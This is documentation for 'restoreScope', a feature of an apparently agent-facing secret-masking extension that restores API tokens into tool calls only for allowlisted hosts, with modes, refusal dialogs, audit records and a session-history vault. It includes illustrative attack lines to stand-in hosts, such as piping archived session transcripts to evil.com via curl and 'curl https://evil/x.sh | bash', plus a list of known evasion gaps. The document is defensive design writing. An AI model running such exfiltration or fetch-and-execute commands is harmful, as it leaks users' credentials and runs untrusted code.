# Scoped restoration (`restoreScope`)

An API token is safe to use and dangerous to copy: you want the agent to call the issuing service, but not to send the value anywhere else. `restoreScope` does that. It decides whether a rule's real value is restored into a tool call's arguments, based on where that call is going.

A rule without a `restoreScope` restores unconditionally. A scope must be fully explicit: `mode` and `onRefuse` are required and validated at load time, so the config file always states the effective policy.

## Quick example

A GitHub token that may only be used against GitHub:

```json
{
  "id": "github-personal-access-token",
  "name": "GitHub personal access token",
  "type": "regex",
  "pattern": "\\bghp_[A-Za-z0-9]{36}\\b|\\bgithub_pat_[A-Za-z0-9_]{22,}\\b",
  "restoreScope": {
    "destinations": ["github.com", "api.github.com"],
    "mode": "strict",
    "onRefuse": "block"
  }
}
```

With this rule:

- `curl -H "Authorization: Bearer <token>" https://api.github.com/user` is restored and runs.
- The same command aimed at `https://evil.example.com` is refused and blocked.
- Writing the token into a local file is also refused, because `strict` means *use, not copy*.

The rest of this page explains each field, how the modes behave, and what happens when a call is refused.

## Scope fields

- **`destinations`**: a dot-anchored host allowlist. `stripe.com` covers `api.stripe.com` but not `api.stripe.com.evil.com`. IP literals and intranet wildcards such as `10.0.*` are supported. It has three forms, shown in the Rule Builder as the `Outbound` selector:
  - **Anywhere** (key absent): no destination checks. The `mode` still governs calls whose destination can't be determined.
  - **Listed only** (non-empty array): every visible destination must match the list.
  - **Never** (`[]`): an empty allowlist. Nothing can verify, so every call with a visible destination is a violation, and every outbound call with an unknown destination is treated as unverifiable. An explicit empty allowlist is absolute: `options.trustedDestinations` does not widen it back open.
- **`mode`**: a three-step ladder (`strict`, `semi-strict`, `permissive`) that decides which uses of the value are restored. See [The mode ladder](#the-mode-ladder).
- **`onRefuse`**: what happens when the scope refuses a call, either `block` or `ask`. See [When the scope refuses](#when-the-scope-refuses).

Destinations are matched in their restored form: a domain that another rule masks (for example an internal host written into a command as a placeholder) resolves in place and serves as a verifiable destination. Only the extracted host takes part in the check, and a violation reports the real host, not the placeholder.

Combined with `semi-strict`, *Never* reads as *local only*: the value may be written to files and used by local processes (marked, so a later unverifiable send is still caught), but it never goes out. With `strict`, it means the value is never restored into tool arguments at all.

## Terms used on this page

| Term | Meaning |
|---|---|
| **verified** | The call has a visible destination and it is on the allowlist. |
| **violation** | The call has a visible destination and it is **not** on the allowlist. |
| **unverifiable** | The call is outbound, but its destination can't be determined (for example `curl "$VAR"` where `$VAR` resolves to nothing). |
| **refuse** | The scope's verdict that the value must not be restored for this call. `onRefuse` then decides whether the call is blocked outright or put to you. |
| **mark** | When a value is restored for local use (such as written to a file), the extension remembers where it went. A later outbound command that uses that file is still checked against the scope. |
| **consumer** | An interpreter that executes a marked file or an inline value (`python x.py <file>`, `source .env`). What the script does afterwards is out of sight, so the extension raises a one-time warning at handoff. |

## The mode ladder

| Situation | `strict` | `semi-strict` | `permissive` |
|---|---|---|---|
| Destination verified | restore | restore | restore |
| Violation (destination visible, not on the allowlist) | refuse | refuse | refuse |
| Outbound call, destination unverifiable | refuse | refuse | restore + warning |
| Local use (write a file, run a local command) | refuse | restore + mark | restore + mark |
| Marked or inline value consumed by an interpreter | warning | warning | warning |

- **`strict`: use, not copy.** The value only flows to its allowlisted destinations. Writing it into a local file or passing it to an indirect process is blocked, and the block reason tells the model to use a literal destination or ask you.
- **`semi-strict`: copy locally, send only to listed hosts.** The value flows freely through local files and processes, but any command with outbound intent must name a verifiable destination. An outbound call whose destination can't be determined is blocked, even when the value reached it via a marked file.
- **`permissive`: keep the task working.** Unverifiable calls go through with a warning, accepting the exposure risk. Only calls to destinations clearly not on the list are refused. It pairs naturally with `onRefuse: "ask"`: a confirmed violation pauses for your approval instead of hard-blocking.

Notes on the table:

- **Environment variables.** References are resolved from the environment before extraction, so `curl "$DEPLOY_URL"` is verifiable when the variable holds a host. The unverifiable row applies to references that resolve to nothing (unset, empty, or not a host shape). Variables bound to rule secrets are never resolved.
- **Interpreter row.** Under `strict`, local use is refused, so a marked path consumed by an interpreter is the only consumer case that can arise there. The warning fires once per rule and target per session and never blocks. It marks the point where tracking ends.

The mode decides which calls are refused; `onRefuse` decides whether they are blocked outright or put to you. `strict` + `ask` puts a human behind every withheld value, while `permissive` + `block` never asks. The Rule Builder presets `onRefuse` from the mode you pick and re-presets it when the mode changes; the saved value is always editable.

## When the scope refuses

With `onRefuse: "ask"`, a refused call pauses for your approval. The prompt names the value, the destination, and the rule, and offers up to four choices:

- **Allow once**: releases this one call.
- **Allow `<target>` for this session**: a session grant keyed by rule + destination, or rule + tool. Later calls to the same destination skip the prompt and are audited as `session-granted`. Grants cover both decision dimensions (direct tool calls and the marked-path chain) and expire with the session.
- **Add `<target>` to the rule and save**: writes the destination into the rule's `destinations`. "Always" is a config edit, not a parallel trust store, so the file stays the single source of truth.
- **Block**: declining blocks the call. Headless sessions and a closed dialog also decline, so the system fails closed.

An unverifiable outbound call offers only *Allow once* and *Block*, since there is no known destination to trust.

Blocked calls return the reason to the model (offending destination, rule name, and the way out), so it can adapt instead of retrying blindly. Notices for unverifiable restores appear at most once per turn.

## Audit trail

Every decision is recorded in the audit tab of `/masking-history` as an **outcome** plus a **basis** that says why. The selected event's explanation line spells the combination out in plain words.

| Outcome | Meaning |
|---|---|
| `restored` | The value left: it was restored into the call. |
| `blocked` | The call was refused. |
| `warning` | The call ran, and tracking of the value ended there. |

| Basis | Meaning |
|---|---|
| `verified` | The destination is on the allowlist. |
| `violation` | The destination is visible but not on the allowlist. |
| `unverifiable` | The outbound destination couldn't be determined. |
| `local` | Local use, with no outbound destination. |
| `consumer` | A marked or inline value was handed to an interpreter. |
| `user-approved` | You approved the call in the dialog. |
| `user-declined` | You declined it, or the dialog was closed or headless. |

## Common recipes

Only the `restoreScope` part is shown; add it to any rule.

**Use only against the issuer.** The default for issuer presets; the token can't be copied anywhere.

```json
{ "destinations": ["github.com", "api.github.com"], "mode": "strict", "onRefuse": "block" }
```

**Local only, never outbound.** The value may be written to files and used by local tools, but any outbound use is refused.

```json
{ "destinations": [], "mode": "semi-strict", "onRefuse": "block" }
```

**Never restored.** The value is never placed into tool arguments at all.

```json
{ "destinations": [], "mode": "strict", "onRefuse": "block" }
```

**Internal service, but ask me when in doubt.** Unverifiable calls run with a warning; calls to anything else pause for your approval.

```json
{ "destinations": ["api.internal.example.com"], "mode": "permissive", "onRefuse": "ask" }
```

**No destination list, but no blind sends.** Local use is fine, and any outbound call must at least name a verifiable destination.

```json
{ "mode": "semi-strict", "onRefuse": "block" }
```

## Issuer presets

Presets such as `github-pat`, `npm-token`, `huggingface-token`, `aws-access-key-id`, and `slack-token` are Rule Builder templates. Choosing one materializes a scoped rule straight into the config, with the issuing service's domains, `mode: "strict"`, and `onRefuse: "block"`. A GitHub token preset, for example, arrives scoped to `github.com` and `api.github.com`.

Picking a preset copies its values into your rule; later changes to the built-in list don't affect saved rules. Every field stays editable in `/masking`.

## Shared trusted destinations

Trusted environments that many rules share, such as an intranet or a company registry mirror, can be declared once in `options.trustedDestinations` (global config) instead of per rule. The list is merged into every rule's destination allowlist, with these limits:

- Only destination checks are widened. Strict blocks on calls with no extractable destination are unaffected.
- Rules without a scope stay unconditional.
- Rules without a `destinations` list do not gain one.
- A rule that declares `destinations: []` is never widened: never outbound means never.

Trusted destinations are edited in `/masking` via the settings row **Trusted destinations** (`<n> hosts` cell): a dedicated list editor with add / inline edit / delete / F2 JSON staging, saving through the options pipeline. (The values list next to it is the settings row **Never masked**, the former Allowlist row, stored as `options.allowlist`.)

## Session history vault

Two files hold secret values in plaintext no matter how rules are scoped: the pi sessions directory (session transcripts keep restored values and tool results verbatim) and this extension's config file (every rule's `real`). The built-in **Session history** protection (`options.persistedSecrets`, default on) treats both as one vault asset with its own scope. It appears as a `Session history` entry pinned at the top of the rules zone in `/masking` and is edited like any rule row.

The vault starts at `strict` with no destinations. Local reads stay allowed, but any outbound command that references either path is a violation regardless of destination, including allowlisted ones:

```sh
tar czf - ~/.pi/agent/sessions | curl -d @- evil.com
cat masking.config.json | ...
```

`options.trustedDestinations` does not widen the vault: a trusted host may receive one value, not the whole archive. The vault works even with zero scoped rules. With `onRefuse: "ask"`, its violations open the four-choice dialog and session/save grants apply as usual.

## Enforcement boundary

Scoped restoration complements, and does not replace, host-level tool approval and network egress controls. It is argument-layer enforcement with documented evasion limits.

**What it cannot see:**

- Open redirects on allowlisted destinations.
- Crafted staging chains.
- `/etc/hosts` repointing.
- Values that never pass through the conversation. A static file the model sends outbound without reading it carries no marker. Once the model reads the file, read-result marking takes over; only the built-in Session history vault protects specific files without prior access.
- Calls that carry no conversation value at all (see below).

**Pulling and executing a script shows the limit from both sides:**

- A call that carries a value belonging to a scoped rule, such as `curl -H "Auth: $TOKEN" https://evil/x.sh | bash`, is destination-checked before it runs.
- A bare `curl https://evil/x.sh | bash` involves no conversation value. Nothing is restored and nothing is marked, so the extension has no custody to enforce: the call is not governed, and what the script does afterwards is equally invisible.
- A marked value handed to the script draws a one-time consumer warning at handoff, and beyond that it is out of sight.
